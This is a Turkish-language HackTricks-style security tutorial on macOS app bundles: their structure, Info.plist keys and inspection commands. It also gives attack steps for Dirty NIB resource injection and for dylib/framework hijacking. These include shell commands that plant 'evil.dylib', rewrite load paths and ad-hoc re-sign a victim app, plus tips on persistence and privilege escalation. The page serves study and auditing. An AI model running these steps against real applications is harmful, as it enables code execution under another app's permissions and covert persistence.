# macOS Paketleri

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

macOS'taki paketler; uygulamalar, library'ler ve diğer gerekli dosyalar dahil olmak üzere çeşitli kaynaklar için container görevi görür. Bu sayede Finder'da tanıdık `*.app` dosyaları gibi tek nesneler olarak görünürler. En sık karşılaşılan paket `.app` paketidir; ancak `.framework`, `.systemextension` ve `.kext` gibi diğer türler de yaygın olarak kullanılır.

### Bir Paketin Temel Bileşenleri

Bir paketin içinde, özellikle `<application>.app/Contents/` dizininde, çeşitli önemli kaynaklar bulunur:

- **\_CodeSignature**: Bu dizin, uygulamanın bütünlüğünü doğrulamak için gerekli code-signing ayrıntılarını depolar. Code-signing bilgilerini şu tür komutları kullanarak inceleyebilirsiniz:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Kullanıcı etkileşimi gerçekleştiğinde çalışan uygulamanın executable binary dosyasını içerir.
- **Resources**: Görseller, belgeler ve arayüz açıklamaları (nib/xib dosyaları) dahil olmak üzere uygulamanın kullanıcı arayüzü bileşenleri için bir depodur.
- **Info.plist**: Uygulamanın ana yapılandırma dosyası olarak görev yapar; sistemin uygulamayı uygun şekilde tanıması ve uygulamayla etkileşim kurması açısından kritik öneme sahiptir.

#### Info.plist İçindeki Önemli Key'ler

`Info.plist` dosyası, aşağıdakiler gibi key'ler içeren uygulama yapılandırmasının temel unsurudur:

- **CFBundleExecutable**: `Contents/MacOS` dizininde bulunan ana executable dosyanın adını belirtir.
- **CFBundleIdentifier**: Uygulama için global bir identifier sağlar; macOS tarafından uygulama yönetimi için yoğun şekilde kullanılır.
- **LSMinimumSystemVersion**: Uygulamanın çalışması için gereken minimum macOS sürümünü belirtir.

### Bundle'ları İnceleme

`Safari.app` gibi bir bundle'ın içeriğini incelemek için şu komut kullanılabilir: `bash ls -lR /Applications/Safari.app/Contents`

Bu inceleme, `_CodeSignature`, `MacOS`, `Resources` gibi dizinleri ve `Info.plist` gibi dosyaları ortaya çıkarır. Bunların her biri uygulamanın güvenliğini sağlamaktan kullanıcı arayüzünü ve çalışma parametrelerini tanımlamaya kadar farklı bir amaca hizmet eder.

#### Ek Bundle Dizinleri

Yaygın dizinlerin yanı sıra bundle'lar şunları da içerebilir:

- **Frameworks**: Uygulama tarafından kullanılan bundled framework'leri içerir. Framework'ler, ek kaynaklara sahip dylib'ler gibidir.
- **PlugIns**: Uygulamanın yeteneklerini geliştiren plug-in'ler ve extension'lar için bir dizindir.
- **XPCServices**: Uygulama tarafından process dışı iletişim için kullanılan XPC service'lerini barındırır.

Bu yapı, gerekli tüm bileşenlerin bundle içinde kapsüllenmesini sağlayarak modüler ve güvenli bir uygulama ortamını kolaylaştırır.

`Info.plist` key'leri ve anlamları hakkında daha ayrıntılı bilgi için Apple developer documentation kapsamlı kaynaklar sunar: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Quarantine uygulanmış bir bundle ilk kez çalıştırıldığında macOS kapsamlı bir signature verification gerçekleştirir ve bundle'ı randomized bir translocated path üzerinden çalıştırabilir. Kabul edildikten sonra sonraki çalıştırmalarda yalnızca yüzeysel kontroller gerçekleştirilir; `Resources/`, `PlugIns/`, nib'ler vb. içindeki resource dosyaları geçmişte kontrol edilmezdi. macOS 13 Ventura'dan beri ilk çalıştırmada kapsamlı bir kontrol zorunlu tutulur ve yeni *App Management* TCC permission'ı, user consent olmadan third-party process'lerin diğer bundle'ları değiştirmesini kısıtlar; ancak eski sistemler hâlâ savunmasızdır.
- **Bundle Identifier collisions**: Aynı `CFBundleIdentifier` değerini yeniden kullanan birden fazla embedded target (PlugIns, helper tools), signature validation işlemini bozabilir ve zaman zaman URL-scheme hijacking/confusion'a olanak sağlayabilir. Her zaman sub-bundle'ları enumerate edin ve benzersiz ID'leri doğrulayın.

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura'dan önce, signed bir uygulamadaki UI resource'larını değiştirmek shallow code signing'i bypass edebilir ve uygulamanın entitlements'larıyla code execution sağlayabilirdi. 2024'teki güncel research, bunun pre-Ventura sistemlerde ve quarantine uygulanmamış build'lerde hâlâ çalıştığını gösteriyor:<sup>[1][2]</sup>

1. Hedef uygulamayı writable bir konuma kopyalayın (ör. `/tmp/Victim.app`).
2. `Contents/Resources/MainMenu.nib` dosyasını (veya `NSMainNibFile` içinde tanımlanan herhangi bir nib'i), `NSAppleScript`, `NSTask` vb. instantiate eden malicious bir nib ile değiştirin.
3. Uygulamayı başlatın. Malicious nib, victim'ın bundle ID'si ve entitlements'ları (TCC grants, microphone/camera vb.) ile çalışır.
4. Ventura+ ilk launch sırasında bundle'ı deep-verify ederek ve sonraki değişiklikler için *App Management* permission'ı gerektirerek riski azaltır; bu nedenle persistence daha zordur, ancak eski macOS sürümlerindeki initial-launch attacks hâlâ geçerlidir.<sup>[1]</sup>

Minimal malicious nib payload örneği (`ibtool` ile xib'i nib'e compile edin):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundle'lar içinde Framework / PlugIn / dylib Hijacking

`@rpath` aramaları bundled Frameworks/PlugIns'ı tercih ettiğinden, `Contents/Frameworks/` veya `Contents/PlugIns/` içine malicious bir library bırakmak, ana binary library validation olmadan veya zayıf `LC_RPATH` sıralamasıyla imzalandığında yükleme sırasını yönlendirebilir.

İmzalanmamış/ad-hoc bir bundle'ı kötüye kullanırken tipik adımlar:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notlar:
- `com.apple.security.cs.disable-library-validation` bulunmayan Hardened Runtime, üçüncü taraf dylib'leri engeller; önce entitlements'ları kontrol edin.
- `Contents/XPCServices/` altındaki XPC servisleri genellikle kardeş framework'leri yükler; persistence veya privilege escalation yolları için ikili dosyalarını benzer şekilde patch'leyin.

## Hızlı İnceleme Cheat Sheet
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referanslar

- [1] [Process injection'ı görünür hale getirmek: nib dosyalarını kullanarak macOS uygulamalarını exploit etmek (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB ve bundle resource tampering write-up'ı (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
